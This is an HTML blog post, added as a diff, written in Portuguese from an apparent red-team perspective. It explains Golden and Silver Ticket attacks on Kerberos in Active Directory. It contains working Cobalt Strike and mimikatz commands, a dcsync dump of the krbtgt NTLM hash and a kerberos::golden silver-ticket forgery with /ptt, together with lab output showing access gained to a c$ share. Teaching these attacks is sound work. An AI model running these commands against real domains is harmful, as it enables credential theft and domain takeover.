@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Golden &amp; Silver | tuxtrack</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Golden &amp; Silver" />
+<meta name="author" content="tuxtrack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Como mostrado no post anterior, em meio ao processo de autenticação de um usuário/computador em um ambiente Microsoft Active Directory utilizando o protocolo Kerberos, uma troca de informações ocorre para validar a conta em questão." />
+<meta property="og:description" content="Como mostrado no post anterior, em meio ao processo de autenticação de um usuário/computador em um ambiente Microsoft Active Directory utilizando o protocolo Kerberos, uma troca de informações ocorre para validar a conta em questão." />
+<link rel="canonical" href="http://localhost:4000/2020/03/02/g&s.html" />
+<meta property="og:url" content="http://localhost:4000/2020/03/02/g&s.html" />
+<meta property="og:site_name" content="tuxtrack" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-03-02T09:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Golden &amp; Silver" />
+<script type="application/ld+json">
+{"url":"http://localhost:4000/2020/03/02/g&s.html","headline":"Golden &amp; Silver","dateModified":"2020-03-02T09:00:00-03:00","datePublished":"2020-03-02T09:00:00-03:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/03/02/g&s.html"},"author":{"@type":"Person","name":"tuxtrack"},"description":"Como mostrado no post anterior, em meio ao processo de autenticação de um usuário/computador em um ambiente Microsoft Active Directory utilizando o protocolo Kerberos, uma troca de informações ocorre para validar a conta em questão.","@type":"BlogPosting","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="tuxtrack" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">tuxtrack<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/tuxtrack"><i class="fab fa-twitter-square"></i></a><a class="color-red-hover" href="https://instagram.com/tuxtrack"><i class="fab fa-instagram"></i></a><a class="color-purple-hover" href="https://github.com/tuxtrack"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="
+            https://github.com/tuxtrack.png
+        " class="author-avatar" alt="Avatar" />
+    
+“The only person in computing that is paid to actually understand the system from top to bottom is the attacker! Everybody else usually gets paid to do their parts.”  Halvar Flake
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Golden & Silver</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/KERBEROS/">KERBEROS</a>
+      
+      <a class="tag" href="/tag/ACTIVE DIRECTORY/">ACTIVE DIRECTORY</a>
+      
+      <a class="tag" href="/tag/REDTEAM/">REDTEAM</a>
+      
+      <a class="tag" href="/tag/WINDOWS/">WINDOWS</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 02 Mar 2020</div>
+  
+  <p>Como mostrado no <a href="https://tuxtrack.github.io/posts/kerberos101/">post anterior</a>, em meio ao processo de autenticação de um usuário/computador em um ambiente Microsoft Active Directory utilizando o protocolo Kerberos, uma troca de informações ocorre para validar a conta em questão.</p>
+
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/kerb.png" alt="" /></p>
+
+<p>Ao ocorrer a solicitação de acesso a algum recurso existente no domínio utilizando o protocolo Kerberos, automaticamente será solicitado ao KDC um ticket do tipo TGT (Ticket-Granting Ticket). Caso a conta seja válida, o KDC retornará o ticket assinado/criptografado pela conta KRBTGT.</p>
+
+<blockquote>
+  <p>KRBTGT is also the security principal name used by the KDC for a Windows Server domain, as specified by RFC 4120. The KRBTGT account is the entity for the KRBTGT security principal, and it is created automatically when a new domain is created. <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)">MS Docs</a></p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/krbtgt.png" alt="" /></p>
+
+<h3 id="golden-tickets">Golden Tickets</h3>
+
+<p>O problema de segurança ocorre quando o hash da conta KRBTGT é comprometido. Nesse momento, o atacante pode forjar TGT’s, assinando-os com o hash obtido e se utilizar de qualquer conta presente no domínio (forjada) empoderando-se dos privilégios concedidos as mesmas ou adicionando novos privilégios alterando a estrutura do ticket.</p>
+
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/gt.png" alt="" /></p>
+
+<ul>
+  <li>Forging Golden Tickets</li>
+</ul>
+
+<p>O ataque em questão foi apresentado por Benjamin Delpy, mais conhecido como <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a>. Ele é o criador das famosas ferramentas <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> e <a href="https://github.com/gentilkiwi/kekeo">Kekeo</a>, amplamente utilizadas por todos no mundo offsec.</p>
+
+<p>Para efeitos de demonstração, foi utilizado a ferramenta Mimikatz para a execução do ataque. Existem outras ferramentas que podem auxiliar na tarefa, como o projeto <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>, presente na toolkit <a href="https://github.com/GhostPack/">GhostPack</a>, projeto da SpecterOps criado para portar a maioria das ferramentas que antes eram escritas em Powershell para C#. Após as <a href="https://devblogs.microsoft.com/powershell/powershell-the-blue-team/">melhorias de seguranças aplicadas a partir da versão 5 do Powershell</a>, muitos ataques começaram a ser bloqueados, causando desconforto para os analistas. Mas isso é história para outro blog post.</p>
+
+<p>Para que o Mimikatz possa executar o ataque, são necessários alguns bits de informação:</p>
+
+<p>User: Usuário no qual o atacante deseja obter iguais privilégios.</p>
+
+<p>Domain Name: FQDN <a href="https://en.wikipedia.org/wiki/Fully_qualified_domain_name">(Fully Qualified Domain Name)</a></p>
+
+<p>Domain SID: Domain SID</p>
+
+<p>KRBTGT NTLM Hash: Hash extraído do usuário KRBTGT.</p>
+
+<p>Como mencionado, o atacante poderá alterar a estrutura do ticket, adicionando outras informações utilizando os parâmetros “/groups:” e “id”, para fornecer informções sobre grupos (Grupos com poderes administrativos: 512,513,518,519,520 ) e RID’s.</p>
+
+<p>O processo de extração do hash da conta KRBTGT pode ser realizado de diversas formas, para mais informações, recomendo a leitura do blog post <a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/">Dumping Domain Password Hashes</a>.</p>
+
+<p>Processo de obtenção do hash através de <a href="https://adsecurity.org/?p=1729">DCSYNC Attack</a>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>dcsync hnr.local krbtgt
+<span class="go">[*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:hnr.local /user:krbtgt command
+[+] host called home, sent: 746570 bytes
+[+] received output:
+[DC] 'hnr.local' will be the domain
+[DC] 'GOKU.hnr.local' will be the DC server
+[DC] 'krbtgt' will be the user account
+Object RDN           : krbtgt
+** SAM ACCOUNT **
+SAM Username         : KRBTGT  
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 11/02/2020 00:41:33
+Object Security ID   : S-1-5-21-45967290-1955130809-1078885739-502
+Object Relative ID   : 502
+Credentials:
+  Hash NTLM: 86db69b9000654a8a4d4b6abe6ed1553
+</span></code></pre></div></div>
+<p>Com as informações necessárias em mãos, a execução do ataque pode ser concluída.</p>
+
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/mimi.png" alt="" /></p>
+
+<p>Com a execução do mimikatz, o ticket para o usuário ganderson foi forjado e submetido na sessão atual utilizando um ataque chamado Pass-The-Ticket, parametro “/ptt” (Devo criar um outro blog post mostrando como funciona o Pass-the-ticket e Over Pass the Hash).</p>
+
+<hr />
+
+<h3 id="silver-tickets">Silver Tickets</h3>
+
+<p>Silver Tickets seguem a mesma ideia do Golden Ticket, porém, forjando um TGS (Service Ticket) em vez do TGT. Os tickets são criados utilizando a conta do computador ou conta de serviço do recurso que o atacante deseja acessar. As informações sobre o usuário, grupo e etc podem ser forjadas sem a necessidade de nenhuma troca de informação entre User Workstation e KDC.</p>
+
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/st.png" alt="" /></p>
+
+<p>Por padrão, as senhas das contas dos computadores são alteradas a cada 30 dias. Logo, o hash da conta pode ser alterado em meio ao projeto, causando perda de acesso. Para contornar o “problema”, é possível solicitar a informação sobre a máquina alvo e verificar o tempo limite até a senha ser alterada novamente.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>powerpick Get-NetComputer <span class="nt">-Name</span> SQL | Select name, samaccounttype, pwdlastset
+<span class="go">[*] Tasked beacon to run: Get-NetComputer -Name SQL | Select name, samaccounttype, pwdlastset (unmanaged)
+[+] host called home, sent: 133715 bytes
+[+] received output:
+
+name  samaccounttype pwdlastset         
+----  -------------- ----------         
+SQL  MACHINE_ACCOUNT 12/02/2020 14:53:05
+</span></code></pre></div></div>
+
+<p>Caso um usuário tente acessar um recurso no qual o mesmo não possui autorização, a negação do acesso é automaticamente efetuada. Para fins de demonstração, foi solicitado o acesso ao serviço de compartilhamento por um usuário que propositalmente não possui privilégios para tal.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>shell <span class="nb">dir</span> <span class="se">\\</span>SQL.hnr.local<span class="se">\c</span><span class="err">$</span>
+<span class="gp">[*] Tasked beacon to run: dir \\SQL.hnr.local\c$</span><span class="w">
+</span><span class="go">[+] host called home, sent: 53 bytes
+[+] received output:
+Access is denied.
+</span></code></pre></div></div>
+
+<p>Para forjar um Silver Ticket, algumas informações adicionais são necessárias:</p>
+
+<p>Taget: FQDN <a href="https://en.wikipedia.org/wiki/Fully_qualified_domain_name">(Fully Qualified Domain Name)</a></p>
+
+<p>Service: Serviço no qual deseja obter acesso (PS-Remoting, WMI, Scheduled Tasks, CIFS, LDAP, WINRM…)</p>
+
+<p>rc4: NTLM Hash do computador/serviço, usado para assinar os tickets de serviço.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>mimikatz kerberos::golden /domain:hnr.local /user:admin /sid:S-1-5-21-45967290-1955130809-1078885739 /target:SQL.hnr.local /service:CIFS /rc4:95e93eb10b58109a6b0227d8c821dbdd /ptt
+<span class="go">[*] Tasked beacon to run mimikatz's kerberos::golden /domain:hnr.local /user:admin /sid:S-1-5-21-45967290-1955130809-1078885739 /target:SQL.hnr.local /service:CIFS /rc4:95e93eb10b58109a6b0227d8c821dbdd /ptt command
+[+] host called home, sent: 998474 bytes
+[+] received output:
+User      : admin
+Domain    : hnr.local (HNR)
+SID       : S-1-5-21-45967290-1955130809-1078885739
+User Id   : 500
+Groups Id : *513 512 520 518 519 
+ServiceKey: 95e93eb10b58109a6b0227d8c821dbdd - rc4_hmac_nt      
+Service   : CIFS
+Target    : SQL.hnr.local
+</span><span class="gp">Lifetime  : 01/03/2020 18:39:26 ;</span><span class="w"> </span>27/02/2030 18:39:26 <span class="p">;</span> 27/02/2030 18:39:26
+<span class="gp">-&gt;</span><span class="w"> </span>Ticket : <span class="k">**</span> Pass The Ticket <span class="k">**</span>
+<span class="go">
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'admin @ hnr.local' successfully submitted for current session
+</span></code></pre></div></div>
+
+<p>Utilizando a ferramenta klist, podemos confirmar que os tickets injetados permanecem armazenados em cache.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>shell klist
+<span class="go">[*] Tasked beacon to run: klist
+[+] host called home, sent: 36 bytes
+[+] received output:
+
+Current LogonId is 0:0x51f1d
+
+</span><span class="gp">#</span>0&gt;	Client: jbolsonaro @ HNR.LOCAL
+<span class="go">	Server: krbtgt/HNR.LOCAL @ HNR.LOCAL
+	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+</span><span class="gp">	Ticket Flags 0x60a10000 -&gt;</span><span class="w"> </span>forwardable forwarded renewable pre_authent name_canonicalize 
+<span class="go">	Start Time: 3/2/2020 13:56:50 (local)
+	End Time:   3/2/2020 23:41:06 (local)
+	Renew Time: 3/8/2020 18:11:06 (local)
+	Session Key Type: AES-256-CTS-HMAC-SHA1-96
+</span><span class="gp">	Cache Flags: 0x2 -&gt;</span><span class="w"> </span>DELEGATION 
+<span class="go">	Kdc Called: GOKU.hnr.local
+
+</span><span class="gp">#</span>1&gt;	Client: jbolsonaro @ HNR.LOCAL
+<span class="go">	Server: host/sql.hnr.local @ HNR.LOCAL
+	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+</span><span class="gp">	Ticket Flags 0x40a10000 -&gt;</span><span class="w"> </span>forwardable renewable pre_authent name_canonicalize 
+<span class="go">	Start Time: 3/1/2020 18:11:06 (local)
+	End Time:   3/2/2020 4:11:06 (local)
+	Renew Time: 3/8/2020 18:11:06 (local)
+	Session Key Type: AES-256-CTS-HMAC-SHA1-96
+	Cache Flags: 0 
+	Kdc Called: GOKU.hnr.local
+</span></code></pre></div></div>
+
+<p>Como pode-se notar, após submeter o Silver Ticket na sessão para o serviço <a href="https://pt.wikipedia.org/wiki/Server_Message_Block">CIFS</a>, o acesso ao compartilhamento foi concedido, demonstrando a perfeita execução do ataque.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>shell <span class="nb">dir</span> <span class="se">\\</span>SQL.hnr.local<span class="se">\c</span><span class="err">$</span>
+<span class="gp">[*] Tasked beacon to run: dir \\SQL.hnr.local\c$</span><span class="w">
+</span><span class="go">[+] host called home, sent: 53 bytes
+[+] received output:
+</span><span class="gp"> Volume in drive \\SQL.hnr.local\c$</span><span class="w"> </span>has no label.
+<span class="go"> Volume Serial Number is 04AB-790B
+
+</span><span class="gp"> Directory of \\SQL.hnr.local\c$</span><span class="w">
+</span><span class="go">
+</span><span class="gp">01/03/2020  11:09    &lt;DIR&gt;</span><span class="w">          </span>HNRDOCS
+<span class="gp">15/09/2018  04:19    &lt;DIR&gt;</span><span class="w">          </span>PerfLogs
+<span class="gp">12/02/2020  17:07    &lt;DIR&gt;</span><span class="w">          </span>Program Files
+<span class="gp">12/02/2020  16:35    &lt;DIR&gt;</span><span class="w">          </span>Program Files <span class="o">(</span>x86<span class="o">)</span>
+<span class="gp">12/02/2020  15:34    &lt;DIR&gt;</span><span class="w">          </span>SQLServer2017Media
+<span class="gp">12/02/2020  15:53    &lt;DIR&gt;</span><span class="w">          </span>Users
+<span class="gp">01/03/2020  18:11    &lt;DIR&gt;</span><span class="w">          </span>Windows
+<span class="go">               0 File(s)              0 bytes
+               7 Dir(s)  47.061.692.416 bytes free
+</span></code></pre></div></div>
+
+<p>O intuito dos posts é se fazer entender como funcionam os ataques. As ferramentas apresentadas são apenas meios para que possamos alcançar um objetivo. Espero que tenha conseguido passar com clareza todas as informações necessárias para o entendimento e sanar quaisquer dúvidas. Caso eu tenha pecado em algo, ou alguma informação não teve embasamento necessário para seu entendimento, por favor entre em contato comigo, ficarei extramente feliz em ajudar.</p>
+
+<p>Até o próximo.!!!</p>
+
+<h5 id="referências">Referências</h5>
+
+<p>Abusing Microsoft Kerberos: Sorry You Guys Don’t Get It <a href="https://www.youtube.com/watch?v=lJQn06QLwEw">https://www.youtube.com/watch?v=lJQn06QLwEw</a></p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2020/03/02/g&s.html';
+     this.page.identifier = '/2020/03/02/g&s';
+     this.page.title = 'Golden & Silver';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//tuxtrack.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2020/05/09/k&d.html">
+            Kerberos & Delegation
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/03/13/dacl.html">
+            DACL & ACE'S ON ACTIVE DIRECTORY
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/02/13/kerberos101.html">
+            Kerberos & Kerberoast
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/acl/" class="set-1">ACL</a> <a href="/tag/active-directory/" class="set-5">ACTIVE DIRECTORY</a> <a href="/tag/delegation/" class="set-1">DELEGATION</a> <a href="/tag/hello-world/" class="set-1">HELLO WORLD</a> <a href="/tag/kerberos/" class="set-2">KERBEROS</a> <a href="/tag/redteam/" class="set-5">REDTEAM</a> <a href="/tag/windows/" class="set-5">WINDOWS</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
